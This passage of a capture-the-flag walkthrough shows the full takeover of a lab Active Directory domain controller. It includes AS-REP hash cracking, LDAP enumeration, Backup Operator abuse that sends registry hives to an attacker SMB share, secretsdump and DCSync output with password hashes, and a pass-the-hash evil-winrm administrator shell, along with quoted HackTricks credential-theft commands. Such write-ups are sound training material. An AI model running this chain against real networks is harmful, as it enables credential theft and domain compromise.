$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:dc54892842ace6ea9ae0f8dc3059e617$f1bab3f0b14d69f1e689f102399a39b0855f16d9f36dfd6a9659d25f0f8484e05592e1d921d90f53dcd80c9cf406b8cee2610214b7350f7ad1ecead5e62872ca83a6044d10c5177e6899e8ab98b3ee861eca740c9c33e8f7efb957c391d5d996e1777cf1b3a90f28799b1ad3d66b12faf35adee855b27fae4552f17d1dbc343458b45464f9e3520fd92a01f00b60dee32f96562958896ff06cbfc2600169fb0e5883a070dee21c961e703b9dc7034fb4eb0b08af27abd3423b86b842e2014e6e3e7ea0a1c98df0f0209db963a28b7515937c1163a7279c78e6e1d3d5cd9c81d3b12527709d10469d87290514cb669cb9312e775a6e65 ←
[-] User fmike40 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User yeli41 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User knina42 doesn't have UF_DONT_REQUIRE_PREAUTH set

[...]
```

`vim ./asrep_hash.txt`:
```
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:dc54892842ace6ea9ae0f8dc3059e617$f1bab3f0b14d69f1e689f102399a39b0855f16d9f36dfd6a9659d25f0f8484e05592e1d921d90f53dcd80c9cf406b8cee2610214b7350f7ad1ecead5e62872ca83a6044d10c5177e6899e8ab98b3ee861eca740c9c33e8f7efb957c391d5d996e1777cf1b3a90f28799b1ad3d66b12faf35adee855b27fae4552f17d1dbc343458b45464f9e3520fd92a01f00b60dee32f96562958896ff06cbfc2600169fb0e5883a070dee21c961e703b9dc7034fb4eb0b08af27abd3423b86b842e2014e6e3e7ea0a1c98df0f0209db963a28b7515937c1163a7279c78e6e1d3d5cd9c81d3b12527709d10469d87290514cb669cb9312e775a6e65
```

`john --wordlist=/usr/share/wordlists/rockyou.txt ./asrep_hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
internet         ($krb5asrep$23$zximena448@SOUPEDECODE.LOCAL) ←   
1g 0:00:00:00 DONE (2024-09-04 03:54) 33.33g/s 17066p/s 17066c/s 17066C/s angelo..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`crackmapexec smb 192.168.56.103 -d 'SOUPEDECODE.LOCAL' -u 'zximena448' -p 'internet' --shares`:
```
SMB         192.168.56.103  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.103  445    DC01             [+] SOUPEDECODE.LOCAL\zximena448:internet 
SMB         192.168.56.103  445    DC01             [+] Enumerated shares
SMB         192.168.56.103  445    DC01             Share           Permissions     Remark
SMB         192.168.56.103  445    DC01             -----           -----------     ------
SMB         192.168.56.103  445    DC01             ADMIN$          READ            Remote Admin
SMB         192.168.56.103  445    DC01             C$              READ,WRITE ←     Default share ←
SMB         192.168.56.103  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.103  445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.56.103  445    DC01             SYSVOL          READ            Logon server share
```

`smbclient -U 'zximena448' --password='internet' //192.168.56.103/C$`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  $WinREAgent                        DH        0  Sat Jun 15 15:19:51 2024
  Documents and Settings          DHSrn        0  Sat Jun 15 22:51:08 2024
  DumpStack.log.tmp                 AHS    12288  Wed Sep  4 12:42:13 2024
  pagefile.sys                      AHS 1476395008  Wed Sep  4 12:42:13 2024
  PerfLogs                            D        0  Sat May  8 04:15:05 2021
  Program Files                      DR        0  Sat Jun 15 13:54:31 2024
  Program Files (x86)                 D        0  Sat May  8 05:34:13 2021
  ProgramData                       DHn        0  Sat Jun 15 22:51:08 2024
  Recovery                         DHSn        0  Sat Jun 15 22:51:08 2024
  System Volume Information         DHS        0  Sat Jun 15 15:02:21 2024
  Users                              DR        0  Mon Jun 17 14:31:08 2024
  Windows                             D        0  Sat Jun 15 15:21:10 2024

                12942591 blocks of size 4096. 10915881 blocks available
smb: \> cd Users\zximena448\Desktop\
smb: \Users\zximena448\Desktop\> dir
  .                                  DR        0  Mon Jun 17 14:31:24 2024
  ..                                  D        0  Mon Jun 17 14:30:22 2024
  desktop.ini                       AHS      282  Mon Jun 17 14:30:22 2024
  user.txt                            A       33  Wed Jun 12 16:01:30 2024 ←

                12942591 blocks of size 4096. 10915862 blocks available
smb: \Users\zximena448\Desktop\> get user.txt ←
getting file \Users\zximena448\Desktop\user.txt of size 33 as user.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \Users\zximena448\Desktop\> exit
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cat ./user.txt`:
```
2fe79*************************** ←
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[389, 636, 3268, 3269 - Pentesting LDAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

[**#Valid Credentials**]

If you have valid credentials to login into the LDAP server, you can dump all the information about the Domain Admin using:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump 
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] -
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`mkdir ./ldapdomaindump`

`ldapdomaindump 192.168.56.103 -u 'SOUPEDECODE.LOCAL\zximena448' -p 'internet' -o ./ldapdomaindump`:
```
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished ←
```

`ls -alps ./ldapdomaindump`:
```
total 4136
   4 drwxr-xr-x  2 root root    4096 Sep  4 05:03 ./
   4 drwx------ 12 root root    4096 Sep  4 05:03 ../
  32 -rw-r--r--  1 root root   29016 Sep  4 05:04 domain_computers_by_os.html
  16 -rw-r--r--  1 root root   12399 Sep  4 05:04 domain_computers.grep
  32 -rw-r--r--  1 root root   28694 Sep  4 05:04 domain_computers.html
 208 -rw-r--r--  1 root root  212790 Sep  4 05:04 domain_computers.json
  12 -rw-r--r--  1 root root   10182 Sep  4 05:04 domain_groups.grep
  20 -rw-r--r--  1 root root   17142 Sep  4 05:04 domain_groups.html
  80 -rw-r--r--  1 root root   79554 Sep  4 05:04 domain_groups.json
   4 -rw-r--r--  1 root root     247 Sep  4 05:04 domain_policy.grep
   4 -rw-r--r--  1 root root    1143 Sep  4 05:04 domain_policy.html
   8 -rw-r--r--  1 root root    5255 Sep  4 05:04 domain_policy.json
   4 -rw-r--r--  1 root root      71 Sep  4 05:04 domain_trusts.grep
   4 -rw-r--r--  1 root root     828 Sep  4 05:04 domain_trusts.html
   4 -rw-r--r--  1 root root       2 Sep  4 05:04 domain_trusts.json
 332 -rw-r--r--  1 root root  336005 Sep  4 05:04 domain_users_by_group.html ←
 224 -rw-r--r--  1 root root  226805 Sep  4 05:04 domain_users.grep
 464 -rw-r--r--  1 root root  471611 Sep  4 05:04 domain_users.html
2680 -rw-r--r--  1 root root 2742444 Sep  4 05:04 domain_users.json
```

`firefox ./ldapdomaindump/domain_users_by_group.html`

Domain Users:

| CN           | Name         | SAM Name  | Created on        | Changed on       | Last Logon          | Flags                             | pwdLastSet        | SID  | Description                                |
|--------------|--------------|-----------|-------------------|------------------|---------------------|-----------------------------------|-------------------|------|--------------------------------------------|
| Paula Felix  | Paula Felix  | pfelix502 | 06/15/24 20:05:01 | 07/06/24 00:19:43 | 01/01/01 00:00:00   | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD  | 06/15/24 20:05:01 | 1599 | Avid traveler and photography enthusiast  |
| Wyatt Liam   | Wyatt Liam   | wliam501  | 06/15/24 20:05:01 | 07/06/24 00:19:43 | 01/01/01 00:00:00   | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD  | 06/15/24 20:05:01 | 1598 | Passionate cook and food blogger           |
| Faith Tina   | Faith Tina   | ftina500  | 06/15/24 20:05:01 | 07/06/24 00:19:43 | 01/01/01 00:00:00   | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD  | 06/15/24 20:05:01 | 1597 | Cycling enthusiast and marathon runner     |
| George Quinn | George Quinn | gquinn499 | 06/15/24 20:05:01 | 07/06/24 00:19:43 | 01/01/01 00:00:00   | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD  | 06/15/24 20:05:01 | 1596 | Music lover and aspiring guitarist         |
| Quinn Kevin  | Quinn Kevin  | qkevin498 | 06/15/24 20:05:01 | 07/06/24 00:19:43 | 01/01/01 00:00:00   | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD  | 06/15/24 20:05:01 | 1595 | Knitting and crochet hobbyist              |
| Tracy Delia  | Tracy Delia  | tdelia497 | 06/15/24 20:05:01 | 07/06/24 00:19:43 | 01/01/01 00:00:00   | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD  | 06/15/24 20:05:01 | 1594 | Art enthusiast and amateur painter         |
| Rita Quinn   | Rita Quinn   | rquinn495 | 06/15/24 20:05:01 | 07/06/24 00:19:43 | 01/01/01 00:00:00   | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD  | 06/15/24 20:05:01 | 1593 | Avid traveler and photography enthusiast  |
| Noah Zara    | Noah Zara    | nzara494  | 06/15/24 20:05:01 | 07/06/24 00:19:43 | 01/01/01 00:00:00   | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD  | 06/15/24 20:05:01 | 1592 | Board game collector and strategist        |
| ...          | ...          | ...       | ...               | ...                | ...                   | ...                               | ...               | ...  | ...                                        |

Backup Operators:

| CN          | Name        | SAM Name   | Created on        | Changed on        | Last Logon          | Flags                                     | pwdLastSet        | SID  | Description                               |
|-------------|-------------|------------|-------------------|-------------------|---------------------|-------------------------------------------|-------------------|------|-------------------------------------------|
| Zach Ximena | Zach Ximena | zximena448 | 06/15/24 20:04:37 | 09/04/24 16:50:59 | 09/04/24 17:04:03   | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQ_PREAUTH | 06/17/24 18:09:53 | 1142 | Volunteer teacher and education advocate  |
| ...         | ...         | ...        | ...               | ...               | ...                 | ...                                       | ...               | ...  | ...                                       |

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[389, 636, 3268, 3269 - Pentesting LDAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

[**#ldapsearch**]

Check null credentials or if your credentials are valid:
```shell
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839
```

If you find something saying that the "_bind must be completed_" means that the credentials are incorrect.

You can extract **everything from a domain** using:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```

Extract **users**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```

Extract **computers**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **my info**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Domain Admins**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Domain Users**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Enterprise Admins**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Administrators**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Remote Desktop Group**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

To see if you have access to any password you can use grep after executing one of the queries:
```shell
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```

Please, notice that the passwords that you can find here could not be the real ones...

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

<🔄 Alternative Step>

`ldapsearch -x -H ldap://192.168.56.103/ -D "zximena448@SOUPEDECODE.LOCAL" -w 'internet' -b "dc=SOUPEDECODE,dc=LOCAL" "(sAMAccountName=zximena448)" memberOf`:
```
# extended LDIF
#
# LDAPv3
# base <dc=SOUPEDECODE,dc=LOCAL> with scope subtree
# filter: (sAMAccountName=zximena448)
# requesting: memberOf 
#

# Zach Ximena, Users, SOUPEDECODE.LOCAL
dn: CN=Zach Ximena,CN=Users,DC=SOUPEDECODE,DC=LOCAL
memberOf: CN=Backup Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL ←

# search reference
ref: ldap://ForestDnsZones.SOUPEDECODE.LOCAL/DC=ForestDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.SOUPEDECODE.LOCAL/DC=DomainDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://SOUPEDECODE.LOCAL/CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

</🔄 Alternative Step>

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>
[Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration)

[**#SMB**]

Kali as server:
```shell
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

Or create a smb share **using samba**:
```shell
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows:
```shell
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`mkdir ./smbshare`

`impacket-smbserver -smb2support 'smbshare' ./smbshare`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

<div>
	<img src="./assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
</div>

[Backup Operator Registry Backup to Domain Compromise](https://github.com/horizon3ai/backup_dc_registry?tab=readme-ov-file)

A simple POC that abuses Backup Operator privileges to remote dump SAM, SYSTEM, and SECURITY hives.

[**#Usage**]

This proof of concept is a modified version of impacket/examples/reg.py and will work with the most recent impacket release installed. All supported impacket authentication mechanisms will work.
```
root@kali:~# python3 reg.py jsmith:'Spring2021'@10.0.229.1 backup -p '\\10.0.220.51\share'
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Dumping SAM hive to \\10.0.220.51\share\SAM
Dumping SYSTEM hive to \\10.0.220.51\share\SYSTEM
Dumping SECURITY hive to \\10.0.220.51\share\SECURITY
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`impacket-reg 'SOUPEDECODE.LOCAL/zximena448:internet@192.168.56.103' backup -o //192.168.56.101/smbshare`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to //192.168.56.101/smbshare\SAM.save ←
[*] Saved HKLM\SYSTEM to //192.168.56.101/smbshare\SYSTEM.save ←
[*] Saved HKLM\SECURITY to //192.168.56.101/smbshare\SECURITY.save ←
```

`ls -alps ./smbshare`:
```
total 11196
    4 drwxr-xr-x  2 root root     4096 Sep  4 05:38 ./
    4 drwx------ 25 kali kali     4096 Sep  4 05:27 ../
   28 -rwxr-xr-x  1 root root    28672 Sep  4 05:38 SAM.save ←
   32 -rwxr-xr-x  1 root root    32768 Sep  4 05:38 SECURITY.save ←
11128 -rwxr-xr-x  1 root root 11395072 Sep  4 05:38 SYSTEM.save ←
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Stealing Windows Credentials](https://book.hacktricks.xyz/windows-hardening/stealing-credentials)

[**#From Registry**]

The easiest way to steal those files is to get a copy from the registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Download** those files to your Kali machine and **extract the hashes** using:
```sh
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

[**#Extracting hashes from NTDS.dit**]

Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
```sh
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

You can also **extract them automatically** using a valid domain admin user:
```sh
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ or **mimikatz** `lsadump::lsa /inject`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`impacket-secretsdump -system ./smbshare/SYSTEM.save -security ./smbshare/SECURITY.save -sam ./smbshare/SAM.save LOCAL`:
``` 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC  ←
$MACHINE.ACC:plain_password_hex:59402f7d480522e40f98bc19790f5b50ab6e61286dc45025483ee0f7768c9e428abe118e4c07b5e29fefa22d09f0b7dafb4aa922fcb8a43e8df6f1272323354c31c4d09837ccd11737f27a969714f4ebed946a7cb9e62efe05af456168770223200df429285f83d20496ea80ff2c7b7bbe194adf9c82183e3d1eac45fb9d7ed61d7eac9d7e094124bb2b54fc220abeec30963e59a08639f04b3cfab6811e644c79e6b5a0fee1cdb7c2fc0390e49378e51cd24d6bb491444f073cf0886fcab138310d45b86f805de03078aab9b2931dcdb2711bb6c94d6b6295730747957afc7524184d39956e514b73152c29cfe2024e
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:0daed4f186dca68d441b1b5415c674b4 ←
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[*] NL$KM 
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[*] Cleaning up... 
```

`crackmapexec smb 192.168.56.103 -u ./domain_users.txt -H 0daed4f186dca68d441b1b5415c674b4`:
```
SMB         192.168.56.103  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.103  445    DC01             [-] SOUPEDECODE.LOCAL\Domain Users:0daed4f186dca68d441b1b5415c674b4 STATUS_LOGON_FAILURE 
SMB         192.168.56.103  445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:0daed4f186dca68d441b1b5415c674b4 STATUS_LOGON_FAILURE 
SMB         192.168.56.103  445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:0daed4f186dca68d441b1b5415c674b4 STATUS_LOGON_FAILURE 

[...]

86dca68d441b1b5415c674b4 STATUS_LOGON_FAILURE 
SMB         192.168.56.103  445    DC01             [-] SOUPEDECODE.LOCAL\fjudy998:0daed4f186dca68d441b1b5415c674b4 STATUS_LOGON_FAILURE 
SMB         192.168.56.103  445    DC01             [-] SOUPEDECODE.LOCAL\admin:0daed4f186dca68d441b1b5415c674b4 STATUS_LOGON_FAILURE
SMB         192.168.56.103  445    DC01             [+] SOUPEDECODE.LOCAL\DC01$:0daed4f186dca68d441b1b5415c674b4 ←
```

`impacket-secretsdump 'SOUPEDECODE.LOCAL/DC01$@192.168.56.103' -hashes 'aad3b435b51404eeaad3b435b51404ee:0daed4f186dca68d441b1b5415c674b4'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd::: ←
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6:::
soupedecode.local\kleo2:1105:aad3b435b51404eeaad3b435b51404ee:bda63615bc51724865a0cd0b4fd9ec14:::
soupedecode.local\eyara3:1106:aad3b435b51404eeaad3b435b51404ee:68e34c259878fd6a31c85cbea32ac671:::
soupedecode.local\pquinn4:1107:aad3b435b51404eeaad3b435b51404ee:92cdedd79a2fe7cbc8c55826b0ff2d54:::
soupedecode.local\jharper5:1108:aad3b435b51404eeaad3b435b51404ee:800f9c9d3e4654d9bd590fc4296adf01:::
soupedecode.local\bxenia6:1109:aad3b435b51404eeaad3b435b51404ee:d997d3309bc876f12cbbe932d82b18a3:::
soupedecode.local\gmona7:1110:aad3b435b51404eeaad3b435b51404ee:c2506dfa7572da51f9f25b603da874d4:::
soupedecode.local\oaaron8:1111:aad3b435b51404eeaad3b435b51404ee:869e9033466cb9f7f8d0ce5a5c3305c6:::
soupedecode.local\pleo9:1112:aad3b435b51404eeaad3b435b51404ee:54a3a0c87893e1051e6f7b629ca144ef:::
soupedecode.local\evictor10:1113:aad3b435b51404eeaad3b435b51404ee:c918a6413865d3701a40071365fa1c3e:::
soupedecode.local\wreed11:1114:aad3b435b51404eeaad3b435b51404ee:a581adbf0e50ba5e4b4c4d95ca190471:::
soupedecode.local\bgavin12:1115:aad3b435b51404eeaad3b435b51404ee:ba78418ef53add0841b76f103e487bf5:::

[...]
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[5985,5986 - Pentesting WinRM](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm)

[**#Using evil-winrm**]

Read **documentation** on its github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```

To use evil-winrm to connect to an **IPv6 address** create an entry inside _**/etc/hosts**_ setting a **domain name** to the IPv6 address and connect to that domain.

Pass the hash with evil-winrm:
```
evil-winrm -u <username> -H <Hash> -i <IP>
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`evil-winrm -i 192.168.56.103 -u 'Administrator' -H '8982babd4da89d33210779a6c5b078bd'`:
```    
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                         
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint ←
```

![Victim: administrator](https://custom-icon-badges.demolab.com/badge/Victim-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
soupedecode\administrator ←
```

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Group Policy Creator Owners            Group            S-1-5-21-2986980474-46765180-2505414164-520 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Domain Admins                          Group            S-1-5-21-2986980474-46765180-2505414164-512 Mandatory group, Enabled by default, Enabled group ←
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Schema Admins                          Group            S-1-5-21-2986980474-46765180-2505414164-518 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288
```

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
